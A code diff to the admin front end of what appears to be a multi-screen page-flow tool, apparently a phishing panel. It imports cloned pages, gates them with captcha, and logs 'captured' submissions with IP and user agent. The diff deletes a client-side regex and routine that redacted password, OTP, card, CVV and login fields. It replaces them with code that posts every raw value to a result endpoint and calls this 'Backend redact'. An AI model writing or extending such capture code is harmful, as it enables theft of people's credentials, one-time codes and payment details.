@@ -833,11 +833,13 @@ function normalizePageResult(result) {
   const date = new Date(createdAt);
   const payload = result.payload || result.fields || {};
   const screen = result.screen || result.pageId || "Page";
+  const fields = resultDisplayFields(payload, screen);
   return {
     ...result,
     status: String(result.status || "new").toLowerCase(),
     screen,
-    fields: resultDisplayFields(payload, screen),
+    fields,
+    coverage: resultFieldCoverage(fields),
     ip: result.ip || "unknown",
     date: Number.isNaN(date.getTime()) ? "--" : date.toLocaleDateString(),
     time: Number.isNaN(date.getTime()) ? "--" : date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
@@ -850,6 +852,7 @@ function isInternalResultField(label) {
 }
 
 function redactedDisplayValue(value) {
+  if (value === "[missing]") return "[missing]";
   if (value === null || value === undefined || value === "" || value === "[blank]") return "[blank]";
   return "[redacted]";
 }
@@ -877,8 +880,9 @@ function normalizeOtpResultFields(fields = {}, screen = "") {
 
   const otpEntries = entries.filter(([label]) => isOtpDigitField(label));
   if (entries.length === 1 || otpEntries.length >= 2 || otpEntries.length === entries.length) {
+    const hasMissing = entries.some(([, value]) => value === "[missing]");
     const hasBlank = entries.some(([, value]) => value === "[blank]" || value === "");
-    return { Otp: hasBlank && entries.length === 1 ? "[blank]" : "[redacted]" };
+    return { Otp: hasMissing ? "[missing]" : hasBlank ? "[blank]" : "[redacted]" };
   }
 
   return fields;
@@ -1065,6 +1069,29 @@ function resultViewerTimelineMarkup(results = [], selectedId = "") {
   `).join("");
 }
 
+function resultFieldCoverage(fields = {}) {
+  const values = Object.entries(fields)
+    .filter(([label]) => !isInternalResultField(label))
+    .map(([, value]) => redactedDisplayValue(value));
+  return {
+    expected: values.length,
+    captured: values.filter((value) => value === "[redacted]").length,
+    blank: values.filter((value) => value === "[blank]").length,
+    missing: values.filter((value) => value === "[missing]").length
+  };
+}
+
+function resultCoverageMarkup(coverage = {}) {
+  return `
+    <div class="result-field-coverage" aria-label="Field capture coverage">
+      <span><b>${Number(coverage.expected || 0)}</b> Expected</span>
+      <span><b>${Number(coverage.captured || 0)}</b> Captured</span>
+      <span><b>${Number(coverage.blank || 0)}</b> Blank</span>
+      <span class="${coverage.missing ? "has-missing" : ""}"><b>${Number(coverage.missing || 0)}</b> Missing</span>
+    </div>
+  `;
+}
+
 function resultViewerContext() {
   if (!activeResultViewer) return null;
   const { page, results = [], selectedId } = activeResultViewer;
@@ -1220,6 +1247,7 @@ function renderResultViewer(options = {}) {
   activeResultViewer.selectedId = result.id;
   const stepIndex = Math.max(results.findIndex((item) => item.id === result.id), 0);
   const fields = resultFieldMarkup(result.fields || {}, result.screen);
+  const coverage = result.coverage || resultFieldCoverage(result.fields || {});
   const sourcePath = [result.hostname, result.path].filter(Boolean).join("");
   const context = resultViewerContext();
 
@@ -1257,9 +1285,10 @@ function renderResultViewer(options = {}) {
           <section class="result-viewer-section">
             <div class="result-viewer-section-head">
               <div><small>submitted fields</small><h3>Captured field map</h3></div>
-              <span>${Object.keys(result.fields || {}).length} field${Object.keys(result.fields || {}).length === 1 ? "" : "s"}</span>
+              <span>${coverage.captured}/${coverage.expected} captured</span>
             </div>
             <p class="result-viewer-redaction">Raw submitted values are never returned to this browser. Only field names and redaction state are shown.</p>
+            ${resultCoverageMarkup(coverage)}
             <div class="result-viewer-fields">
               ${fields || `<div><span>Status</span><strong>No form fields saved for this result</strong></div>`}
             </div>
@@ -1734,6 +1763,7 @@ function sessionResultDetailMarkup(session, page) {
           </label>
         </div>
       </div>
+      ${resultCoverageMarkup(result.coverage || resultFieldCoverage(result.fields || {}))}
       <div class="result-fields">
         ${resultFieldMarkup(result.fields || {}, result.screen) || `
           <div>
@@ -2224,6 +2254,42 @@ function refreshImportedScreenOrder() {
   });
 }
 
+function screenFieldManifestMarkup(screen) {
+  const fieldManifest = screen.fieldManifest || {};
+  const fields = Array.isArray(fieldManifest.fields) ? fieldManifest.fields : [];
+  const warnings = Array.isArray(fieldManifest.warnings) ? fieldManifest.warnings : [];
+  const needsReview = Boolean(fieldManifest.needsReview || fields.some((field) => field.needsReview));
+  const supportedTypes = ["text", "email", "tel", "number", "date", "datetime-local", "textarea", "select", "select-multiple", "checkbox", "radio", "password"];
+  return `
+    <details class="screen-field-editor ${needsReview || warnings.length ? "needs-review" : ""}" ${needsReview || warnings.length ? "open" : ""}>
+      <summary>
+        <span>Result fields</span>
+        <strong>${fields.length}</strong>
+        <em>${warnings.length ? `${warnings.length} warning${warnings.length === 1 ? "" : "s"}` : needsReview ? "Review required" : "Mapped"}</em>
+      </summary>
+      <div class="screen-field-editor-body">
+        ${warnings.length ? `<div class="screen-field-warnings">${warnings.map((warning) => `<span>${escapeHtml(warning)}</span>`).join("")}</div>` : ""}
+        ${fields.length ? fields.map((field, index) => {
+          const typeOptions = Array.from(new Set([field.type, ...supportedTypes].filter(Boolean)));
+          return `
+            <div class="screen-field-row ${field.needsReview ? "needs-review" : ""}" data-package-field-row data-package-field-id="${escapeHtml(field.id)}" data-package-field-source-label="${escapeHtml(field.sourceLabel || field.label || field.id)}" data-package-field-source-type="${escapeHtml(field.sourceType || field.type || "text")}" data-package-field-source-required="${(field.sourceRequired ?? field.required) ? "true" : "false"}" data-package-field-scope="${escapeHtml(field.scopeId || "page")}">
+              <strong>${String(index + 1).padStart(2, "0")}</strong>
+              <label><small>Result label</small><input type="text" maxlength="160" data-package-field-label value="${escapeHtml(field.label || field.id)}"></label>
+              <label><small>Control type</small><select data-package-field-type>${typeOptions.map((type) => `<option value="${escapeHtml(type)}" ${field.type === type ? "selected" : ""}>${escapeHtml(type)}</option>`).join("")}</select></label>
+              <label><small>Sensitivity</small><select data-package-field-sensitivity>${["standard", "personal", "authentication-secret", "financial"].map((sensitivity) => `<option value="${sensitivity}" ${field.sensitivity === sensitivity ? "selected" : ""}>${sensitivity.replace(/-/g, " ")}</option>`).join("")}</select></label>
+              <div class="screen-field-flags">
+                <label><input type="checkbox" data-package-field-required ${field.required ? "checked" : ""}> Required</label>
+                <label><input type="checkbox" data-package-field-enabled ${field.enabled !== false ? "checked" : ""}> Expected</label>
+                <code>Backend redact</code>
+              </div>
+            </div>
+          `;
+        }).join("") : `<p class="screen-field-empty">No standard form controls were detected on this screen.</p>`}
+      </div>
+    </details>
+  `;
+}
+
 function collectAdminPackagePayload(page) {
   const value = (name, fallback = "") => preview.querySelector(`[data-package-field="${name}"]`)?.value.trim() ?? fallback;
   const billingPeriods = {};
@@ -2240,6 +2306,20 @@ function collectAdminPackagePayload(page) {
     const file = String(row.dataset.packageScreenFile || "").trim();
     const buttonLabel = row.querySelector("[data-package-screen-label]")?.value.trim() || "";
     if (!buttonLabel) throw new Error(`Enter a redirect button name for ${file}`);
+    const fields = [...row.querySelectorAll("[data-package-field-row]")].map((fieldRow) => ({
+      id: fieldRow.dataset.packageFieldId,
+      label: fieldRow.querySelector("[data-package-field-label]")?.value.trim() || fieldRow.dataset.packageFieldId,
+      sourceLabel: fieldRow.dataset.packageFieldSourceLabel || fieldRow.dataset.packageFieldId,
+      type: fieldRow.querySelector("[data-package-field-type]")?.value || "text",
+      sourceType: fieldRow.dataset.packageFieldSourceType || "text",
+      scopeId: fieldRow.dataset.packageFieldScope || "page",
+      required: Boolean(fieldRow.querySelector("[data-package-field-required]")?.checked),
+      sourceRequired: fieldRow.dataset.packageFieldSourceRequired === "true",
+      enabled: Boolean(fieldRow.querySelector("[data-package-field-enabled]")?.checked),
+      sensitivity: fieldRow.querySelector("[data-package-field-sensitivity]")?.value || "standard",
+      policy: "redact",
+      needsReview: false
+    }));
     return {
       id,
       file,
@@ -2249,7 +2329,14 @@ function collectAdminPackagePayload(page) {
       enabled: Boolean(row.querySelector("[data-package-screen-enabled]")?.checked),
       showInRedirects: Boolean(row.querySelector("[data-package-screen-redirect]")?.checked),
       needsReview: false,
-      order
+      order,
+      fieldManifest: {
+        version: 1,
+        screenId: id,
+        fields,
+        warnings: [],
+        needsReview: false
+      }
     };
   });
   const entryScreenId = rows.find((row) => row.querySelector("[data-package-screen-entry]")?.checked)?.dataset.packageScreenId || "";
@@ -3127,6 +3214,16 @@ function createGeneratedIndex(page) {
         return config.apiBase.replace(/\\/$/, "") + "/" + path.replace(/^\\//, "");
       }
 
+      function secureTransport(url) {
+        try {
+          const target = new URL(url, window.location.href);
+          return target.protocol === "https:"
+            || ["localhost", "127.0.0.1", "::1"].includes(target.hostname);
+        } catch (error) {
+          return false;
+        }
+      }
+
       function setStatus(items) {
         runtimeStatus.innerHTML = items.map((item) => "<span>" + item + "<\\/span>").join("");
       }
@@ -3311,18 +3408,6 @@ function createGeneratedIndex(page) {
         return "text";
       }
 
-      function isSensitiveField(field, input) {
-        const text = [
-          field,
-          input && input.name,
-          input && input.id,
-          input && input.type,
-          input && input.autocomplete,
-          input && input.placeholder
-        ].filter(Boolean).join(" ").toLowerCase();
-        return /password|passcode|otp|one.?time|verification|2fa|mfa|pin|card|cc|credit|debit|cvv|cvc|security.?code|expiry|exp|routing|account|ssn|social|token|secret|credential|login|email/.test(text);
-      }
-
       function fieldLabel(input) {
         const escapedId = input.id && window.CSS && CSS.escape ? CSS.escape(input.id) : "";
         const label = escapedId ? document.querySelector('label[for="' + escapedId + '"]') : null;
@@ -3336,20 +3421,38 @@ function createGeneratedIndex(page) {
           || "Field";
       }
 
-      function safeFormData(form) {
-        const data = {};
+      function generatedFieldId(screenName, field, index) {
+        const screenKey = String(screenName || "screen").toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "").slice(0, 36) || "screen";
+        const fieldKey = String(field || "field").toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "").slice(0, 44) || "field";
+        return "generated_" + screenKey + "_" + fieldKey + "_" + String(index + 1);
+      }
+
+      function collectedFieldType(input) {
+        if (input.tagName === "SELECT") return input.multiple ? "select-multiple" : "select";
+        if (input.tagName === "TEXTAREA") return "textarea";
+        return String(input.type || "text").toLowerCase();
+      }
+
+      function collectedFieldValue(input) {
+        const type = collectedFieldType(input);
+        if ((type === "checkbox" || type === "radio") && !input.checked) return "";
+        if (type === "select-multiple") return Array.from(input.selectedOptions || []).map((option) => option.value || "");
+        return input.value || "";
+      }
+
+      function formFieldsForBackend(form, screen) {
         const fields = Array.from(form.elements || []).filter(function (input) {
-          return input && !input.disabled && !["submit", "button", "reset", "file"].includes(String(input.type || "").toLowerCase());
+          return input && !input.disabled && !["submit", "button", "reset", "file", "hidden", "image"].includes(String(input.type || "").toLowerCase());
         });
-        fields.forEach(function (input) {
-          if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
-          const key = fieldLabel(input).replace(/\\s+/g, " ").trim();
-          if (!key) return;
-          data[key] = isSensitiveField(key, input) ? (input.value ? "[redacted]" : "[blank]") : input.value || "";
+        return fields.map(function (input, index) {
+          const label = fieldLabel(input).replace(/\\s+/g, " ").trim().slice(0, 160) || "Field";
+          return {
+            id: input.getAttribute("data-deuce-field-id") || generatedFieldId(screen.name, label, index),
+            label: label,
+            type: collectedFieldType(input),
+            value: collectedFieldValue(input)
+          };
         });
-        data._fieldCount = fields.length;
-        data._redaction = "passwords, OTPs, card fields, login/email credentials, tokens, and similar sensitive values are not stored";
-        return data;
       }
 
       function turnstileSiteKey() {
@@ -3526,10 +3629,10 @@ function createGeneratedIndex(page) {
         ]);
 
         const fields = fieldsFor(screen);
-        screenForm.innerHTML = fields.map((field) => \`
+        screenForm.innerHTML = fields.map((field, index) => \`
           <label>
             <span>\${field}</span>
-            <input required type="\${inputTypeFor(field)}" name="\${field.toLowerCase().replace(/\\s+/g, "_")}" autocomplete="off">
+            <input required type="\${inputTypeFor(field)}" name="\${field.toLowerCase().replace(/\\s+/g, "_")}" data-deuce-field-id="\${generatedFieldId(screen.name, field, index)}" autocomplete="off">
           </label>
         \`).join("") + \`
           <div class="captcha-box \${config.security?.captcha && !captchaPassed ? "active" : ""}">
@@ -3551,7 +3654,7 @@ function createGeneratedIndex(page) {
       }
 
       function storeScreenData(screen) {
-        sessionData[screen.name] = safeFormData(screenForm);
+        sessionData[screen.name] = formFieldsForBackend(screenForm, screen);
       }
 
       function sendResult(screen) {
@@ -3567,7 +3670,13 @@ function createGeneratedIndex(page) {
           sessionId,
           screen: screen.name,
           flow: config.screens.map((item) => item.name),
-          data: sessionData,
+          capture: {
+            version: 1,
+            source: "generated-runtime",
+            scopeId: "generated-flow",
+            fields: Object.values(sessionData).flat()
+          },
+          screenFile: "generated-flow",
           hostname: window.location.hostname,
           path: window.location.pathname,
           userAgent: navigator.userAgent,
@@ -3576,12 +3685,14 @@ function createGeneratedIndex(page) {
           createdAt: new Date().toISOString()
         };
 
-        fetch(config.runtime.resultEndpoint || endpoint(config.resultSettings?.webhook || "/api/page-results"), {
+        const resultUrl = config.runtime.resultEndpoint || endpoint(config.resultSettings?.webhook || "/api/page-results");
+        if (!secureTransport(resultUrl)) return;
+        fetch(resultUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         }).catch(() => {
-          console.info("DEUCE Pages result payload queued for Render API", payload);
+          console.info("DEUCE Pages result submission could not reach the API");
         });
       }
 
@@ -4398,8 +4509,8 @@ function githubLivePanelMarkup(page) {
     ? "Checking branch"
     : status?.error
       ? "Check failed"
-      : status?.commitChanged || changeCount
-        ? drift.hasStructuralChanges ? "Screen review needed" : "Code changes live"
+      : status?.commitChanged || changeCount || drift.requiresReview
+        ? drift.requiresReview ? "Screen or field review needed" : "Code changes live"
         : status
           ? "In sync"
           : persistedHealth.state === "unhealthy"
@@ -4409,7 +4520,7 @@ function githubLivePanelMarkup(page) {
               : persistedHealth.state === "degraded"
                 ? "Check failed"
                 : "Live branch connected";
-  const stateClass = status?.error || drift.hasStructuralChanges || ["unhealthy", "review", "degraded"].includes(persistedHealth.state)
+  const stateClass = status?.error || drift.requiresReview || ["unhealthy", "review", "degraded"].includes(persistedHealth.state)
     ? "warning"
     : status?.commitChanged || changeCount ? "active" : "ready";
   const folder = github.folder || status?.folder || "repository root";
@@ -4432,12 +4543,13 @@ function githubLivePanelMarkup(page) {
           <div><small>Latest</small><strong>${escapeHtml(shortCommit(currentCommit))}</strong><span>Checked ${escapeHtml(checkedAt)}</span></div>
           <div><small>Files</small><strong>${changeCount}</strong><span>${status ? `${status.fileDiff?.added?.length || 0} added / ${status.fileDiff?.removed?.length || 0} removed / ${status.fileDiff?.modified?.length || 0} edited` : "Awaiting branch check"}</span></div>
           <div><small>Screens</small><strong>${(drift.addedScreens?.length || 0) + (drift.missingScreens?.length || 0) + (drift.renamedScreens?.length || 0) + (drift.restoredScreens?.length || 0)}</strong><span>${drift.addedScreens?.length || 0} new / ${drift.missingScreens?.length || 0} missing / ${drift.renamedScreens?.length || 0} renamed / ${drift.restoredScreens?.length || 0} restored</span></div>
+          <div><small>Fields</small><strong>${drift.fieldChanges?.length || 0}</strong><span>${(drift.fieldChanges || []).reduce((total, item) => total + (item.added?.length || 0), 0)} added / ${(drift.fieldChanges || []).reduce((total, item) => total + (item.removed?.length || 0), 0)} removed / ${(drift.fieldChanges || []).reduce((total, item) => total + (item.changed?.length || 0), 0)} changed</span></div>
         </div>
       `}
-      <p class="github-live-note">Page code is read from this mutable branch at runtime. Apply sync only when you want to accept its current file inventory and review changed screen mappings.</p>
+      <p class="github-live-note">Page code is read from this mutable branch at runtime. Apply sync when you want to accept its current file inventory and review changed screen or result-field mappings.</p>
       <div class="admin-actions">
         <button type="button" data-github-live-check="${escapeHtml(page.id)}" ${status?.loading ? "disabled" : ""}>${status?.loading ? "Checking..." : "Check GitHub"}</button>
-        <button type="button" class="primary" data-github-live-sync="${escapeHtml(page.id)}" ${!hasChanges || status?.loading || status?.error ? "disabled" : ""}>Apply screen sync</button>
+        <button type="button" class="primary" data-github-live-sync="${escapeHtml(page.id)}" ${!hasChanges || status?.loading || status?.error ? "disabled" : ""}>Apply manifest sync</button>
       </div>
     </article>
   `;
@@ -4897,6 +5009,7 @@ async function renderAdminPackageEditor(packageSlug = "page-a") {
                 </div>
                 <em>${screen.id === configuredEntryId ? "Entry" : screen.id === configuredFinalId ? "Final" : "Screen"}</em>
                 <span class="screen-order-actions"><button type="button" data-package-screen-move="up" aria-label="Move ${escapeHtml(screen.buttonLabel)} up">&#8593;</button><button type="button" data-package-screen-move="down" aria-label="Move ${escapeHtml(screen.buttonLabel)} down">&#8595;</button>${screen.missing ? `<button type="button" class="danger" data-package-screen-remove aria-label="Remove missing ${escapeHtml(screen.buttonLabel)} mapping">Remove</button>` : ""}</span>
+                ${screenFieldManifestMarkup(screen)}
               </div>
             `).join("")}
           </div>
@@ -7206,6 +7319,7 @@ function renderLocalImportResult(result) {
   resultPanel.innerHTML = `
     <code>${escapeHtml(pagePackage ? `${pagePackage.name} ${pagePackage.status}` : "Local import complete")}</code>
     <code>${Number(result.files || scan.files?.length || 0)} files saved to private R2 storage.</code>
+    <code>${Number(scan.summary?.fields || 0)} result fields mapped across ${(scan.screens || []).length} screen(s).</code>
     <code>${escapeHtml(review.status || "ready")} — ${(review.warnings || []).length} warning(s)</code>
     ${(review.warnings || []).map((warning) => `<code>${escapeHtml(warning)}</code>`).join("")}
     ${pagePackage ? `<div class="import-result-actions">${previewReady ? `<button type="button" data-admin-package-preview="${escapeHtml(pagePackage.slug)}">Open package preview</button>` : ""}<button type="button" data-route="#admin-package-${escapeHtml(pagePackage.slug)}">Map screens & publish</button></div>` : ""}
@@ -7667,7 +7781,7 @@ function renderGithubImportResult(scan, pagePackage) {
     <code>${pagePackage ? `${pagePackage.status === "published" ? "Published" : "Draft"} package ready: ${pagePackage.name} (${pagePackage.slug})` : `Connected: ${scan.owner}/${scan.repo}`}</code>
     <code>Branch: ${scan.branch}${scan.folder ? ` / folder: ${scan.folder}` : ""}</code>
     <code>Live source: mutable branch / commit ${escapeHtml(shortCommit(scan.commitSha))} / ${scan.summary.excludedFiles || 0} private or unsupported files excluded</code>
-    <code>Files: ${scan.summary.totalFiles} total / ${scan.summary.html} HTML / ${scan.summary.css} CSS / ${scan.summary.assets} assets</code>
+    <code>Files: ${scan.summary.totalFiles} total / ${scan.summary.html} HTML / ${scan.summary.css} CSS / ${scan.summary.assets} assets / ${scan.summary.fields || 0} result fields</code>
     <div class="import-review-list">
       ${(review.checks || []).map((check) => `
         <span class="is-${escapeHtml(check.status)}">
